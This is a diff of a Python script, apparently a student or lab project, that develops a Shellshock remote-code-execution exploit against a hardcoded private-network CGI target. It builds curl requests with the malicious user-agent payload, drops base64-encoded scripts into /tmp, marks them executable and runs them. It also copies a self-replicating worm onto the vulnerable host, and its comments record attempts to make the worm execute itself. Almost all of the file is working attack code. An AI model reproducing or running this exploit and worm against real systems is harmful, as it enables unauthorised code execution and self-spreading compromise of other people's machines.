@@ -46,7 +46,7 @@ def local_replicate():
 	os.system('cp ' + name + ' test')
 """
 
-# Prototype for shellshock exploit via python
+# Prototype for shellshock exploit
 def exploit():
 	print('run exploit')
 	targets = {'192.168.56.111': '/cgi-bin/shock.sh'} # Hardcoding this for now
@@ -66,18 +66,19 @@ def exploit():
 	cmd_list.append('echo ZWNobyAnUkNFIHN1Y2Nlc3NmdWwnID4gL3RtcC90ZXN0X1JDRXN1Y2Nlc3MudHh0 > /tmp/testRCE') # echo 'RCE successful' > /tmp/test_RCEsuccess.txt
 	cmd_list.append('base64 -d /tmp/testRCE > /tmp/testRCE.sh')
 	cmd_list.append('chmod 777 /tmp/testRCE.sh')
-	cmd_list.append('/tmp/testRCE.sh') # Successful when test_success.txt file gets created, proving creation and execution of a file on remote host
+	cmd_list.append('/tmp/testRCE.sh') # Successful when test_RCEsuccess.txt file gets created, proving creation and execution of a file on remote host
 
-	# Worm copying itself & executing itself on vulnerable host
+	# Worm copying itself on vulnerable host
 	cmd_list.append(f'echo {encoded} > /tmp/testworm')
 	cmd_list.append('base64 -d /tmp/testworm > /tmp/testworm.py')
 	cmd_list.append('chmod 777 /tmp/testworm.py')
 
-	#cmd_list.append('python3 /tmp/testworm.py') #doesn't work
-	#cmd_list.append('/tmp/testworm.py') #doesn't work
+	# TODO: How to get worm (a .py file) to execute itself on remote host?
 
-	# Actually executing the worm; cmd_list.append('python3 /tmp/testworm.py') and its variants didn't work...so using a bash script for now
-	# So this still doesn't work... is it because python cannot be executed through a webshell
+	# cmd_list.append('python3 /tmp/testworm.py') # doesn't work
+	# cmd_list.append('/tmp/testworm.py') # doesn't work
+
+	# Try executing bash script to run .py file. Also doesn't work
 	cmd_list.append('echo cHl0aG9uMyAvdG1wL3Rlc3R3b3JtLnB5 > /tmp/testRun') # python3 /tmp/testworm.py
 	cmd_list.append('base64 -d /tmp/testRun > /tmp/testRun.sh')
 	cmd_list.append('chmod 777 /tmp/testRun.sh')
@@ -88,16 +89,16 @@ def exploit():
 	for IP in targets:
 		vulnerable_path = targets[IP]
 		url = f'http://{IP}{vulnerable_path}'
-		print(url) # Debug
+#		print(url) # Debug
 
-# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/tmp/testRun.sh'" http://192.168.56.111/cgi-bin/shock.sh
+#	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/tmp/testRun.sh'" http://192.168.56.111/cgi-bin/shock.sh
 
 		for cmd in cmd_list:
-			print('run cmd')
+#			print('run cmd') # Debug
 			exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
 			exploit += '\'' + cmd + '\'"'
 			exploit += ' ' + url
-		#	subprocess.run(exploit, shell=True)
+			# subprocess.run(exploit, shell=True)
 			os.system(exploit)
 
 def main():
